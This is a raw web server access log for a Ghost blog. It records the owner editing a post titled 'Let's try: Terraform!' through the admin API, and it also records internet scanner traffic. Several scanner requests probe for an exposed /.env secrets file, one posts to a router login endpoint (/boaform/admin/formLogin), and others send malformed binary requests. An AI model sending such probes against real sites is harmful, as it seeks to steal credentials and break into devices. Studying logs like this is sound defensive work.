5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/assets/img/user-image-639a88b784fb5f10964be8b975ca9fdf.png HTTP/2.0" 200 2479 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/assets/img/dashboard/bp1-03a13253453b372d0bbd5e6a19b20fca.jpg HTTP/2.0" 200 262731 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/assets/img/dashboard/bp2-ed14f9f48c56d5d6fe997dc637a8b1ad.jpg HTTP/2.0" 200 66579 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/assets/img/dashboard/join-community-bb5478f7dca6c04a2d0baf2b02f880fb.jpg HTTP/2.0" 200 105052 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/members/stats/mrr/ HTTP/2.0" 200 28 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/members/?filter=status%3Apaid&order=created_at%20asc&limit=5&include=labels%2CemailRecipients HTTP/2.0" 200 101 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:52 +0200] "GET /ghost/api/canary/admin/posts/?limit=30&page=1&filter=status%3Adraft HTTP/2.0" 200 1861 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:52 +0200] "GET /ghost/api/canary/admin/tags/?limit=all HTTP/2.0" 200 649 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:52 +0200] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:52 +0200] "GET /ghost/api/canary/admin/users/?limit=all&include=roles HTTP/2.0" 200 780 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:54 +0200] "GET /ghost/api/canary/admin/members/?limit=1&filter=subscribed%3Atrue&include=labels%2CemailRecipients HTTP/2.0" 200 101 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:54 +0200] "GET /ghost/api/canary/admin/snippets/?limit=all HTTP/2.0" 200 106 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:03 +0200] "GET /ghost/api/canary/admin/slugs/post/Let's%20try%3A%20Terraform!/ HTTP/2.0" 200 41 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:04 +0200] "POST /ghost/api/canary/admin/posts/ HTTP/2.0" 201 755 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:04 +0200] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1826 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:26 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 752 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:29 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 767 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:43 +0200] "GET /ghost/api/canary/admin/oembed/?url=https%3A%2F%2Fopen.spotify.com%2Ftrack%2F7gDJVeFi4WDc6hNzhhg7j2%3Fsi%3Da135d41549f6488c&type=embed HTTP/2.0" 200 581 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:46 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1118 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:49 +0200] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1826 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:49 +0200] "GET /p/6fb7df86-16c2-40a8-b9f8-a5ebba53ad05/ HTTP/2.0" 200 14352 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:49 +0200] "GET /assets/scripts/main.js?v=d702cadabc HTTP/2.0" 200 9977 "https://krzwiatrzyk.eu/p/6fb7df86-16c2-40a8-b9f8-a5ebba53ad05/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:49 +0200] "GET /content/images/size/w300/2021/10/d417ce9e68114f09acc670e5928685a3--5--1.png HTTP/2.0" 200 2741 "https://krzwiatrzyk.eu/p/6fb7df86-16c2-40a8-b9f8-a5ebba53ad05/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:49 +0200] "GET /assets/images/avatar.png?v=d702cadabc HTTP/2.0" 200 1550 "https://krzwiatrzyk.eu/p/6fb7df86-16c2-40a8-b9f8-a5ebba53ad05/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:33:49 +0200] "GET /favicon.png HTTP/2.0" 200 2741 "https://krzwiatrzyk.eu/p/6fb7df86-16c2-40a8-b9f8-a5ebba53ad05/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:34:06 +0200] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1826 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:34:06 +0200] "GET /p/6fb7df86-16c2-40a8-b9f8-a5ebba53ad05/ HTTP/2.0" 304 0 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:34:47 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1139 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:36:06 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1181 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:36:20 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1181 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:36:23 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1235 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:36:37 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1246 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:36:40 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1243 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:36:49 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1247 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:36:55 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1261 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:37:04 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1184 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:37:12 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1245 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:37:24 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1255 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:41:28 +0200] "GET /ghost/api/canary/admin/slugs/post/Let's%20try%3A%20Terraform!/ HTTP/2.0" 200 43 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:41:28 +0200] "PUT /ghost/api/canary/admin/posts/616d93b0d126780001c887a6/ HTTP/2.0" 200 1264 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:41:38 +0200] "GET /ghost/assets/img/unsplash-404-71ab3705c9920a9706bb822c3d7e34d1.png HTTP/2.0" 200 2170 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:54:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:18:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
205.185.120.103 - - [18/Oct/2021:18:09:11 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
31.27.237.92 - - [18/Oct/2021:18:15:44 +0200] "GET / HTTP/1.0" 301 162 "-" "-"
5.173.42.7 - - [18/Oct/2021:18:24:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
128.14.209.162 - - [18/Oct/2021:18:24:43 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.31.134 - - [18/Oct/2021:18:25:46 +0200] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.31.134 - - [18/Oct/2021:18:25:46 +0200] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\x1D\xCC\x14\xEDy\xCC\x5Cwq\xBF%/\xB6\x05\x9ET\xBCwz C\xF60\xFBgL(\x86\xA7\xE0f\xEF s\x19\xBA],\x80\x9B\x84\xB0\x0C\xDC\x12\x5Ch\xF5I\xFD\xD2\x16\xCE\x0E\xAB\xE1$\xE3\xA5" 400 150 "-" "-"
185.254.31.134 - - [18/Oct/2021:18:25:46 +0200] "POST /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.138.42 - - [18/Oct/2021:18:35:35 +0200] "GET / HTTP/1.1" 301 162 "-" "-"
167.94.138.42 - - [18/Oct/2021:18:35:35 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.42 - - [18/Oct/2021:18:35:35 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.54.186 - - [18/Oct/2021:18:36:00 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.54.186 - - [18/Oct/2021:18:36:00 +0200] "" 400 0 "-" "-"
5.173.42.7 - - [18/Oct/2021:18:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:18:54:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:19:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
71.6.146.185 - - [18/Oct/2021:19:13:32 +0200] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
71.6.146.185 - - [18/Oct/2021:19:13:39 +0200] "" 400 0 "-" "-"
71.6.146.185 - - [18/Oct/2021:19:13:39 +0200] "" 400 0 "-" "-"
71.6.146.185 - - [18/Oct/2021:19:13:40 +0200] "" 400 0 "-" "-"
71.6.146.185 - - [18/Oct/2021:19:13:45 +0200] "GET /robots.txt HTTP/1.1" 200 1345 "-" "-"
71.6.146.185 - - [18/Oct/2021:19:13:45 +0200] "GET /sitemap.xml HTTP/1.1" 200 1345 "-" "-"
71.6.146.185 - - [18/Oct/2021:19:13:46 +0200] "GET /.well-known/security.txt HTTP/1.1" 200 1345 "-" "-"
71.6.146.185 - - [18/Oct/2021:19:13:47 +0200] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
71.6.146.185 - - [18/Oct/2021:19:13:52 +0200] "" 400 0 "-" "-"
71.6.146.185 - - [18/Oct/2021:19:13:52 +0200] "\x03K\xABma\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
130.211.54.158 - - [18/Oct/2021:19:13:57 +0200] "GET / HTTP/1.1" 200 595 "-" "python-requests/2.26.0"
104.155.101.3 - - [18/Oct/2021:19:13:58 +0200] "GET / HTTP/1.1" 200 595 "-" "python-requests/2.26.0"
96.19.238.67 - - [18/Oct/2021:19:19:50 +0200] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
96.19.238.67 - - [18/Oct/2021:19:19:51 +0200] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:19:24:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
139.162.145.250 - - [18/Oct/2021:19:26:14 +0200] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xF6#\x1F\xD2P|\x96sm<\x1BkD\xAE\x8B[\x8D\xB60\xCE\xE6\xEA2y\x0F\x1D\x81k3\xD9Rh\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
5.173.42.7 - - [18/Oct/2021:19:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
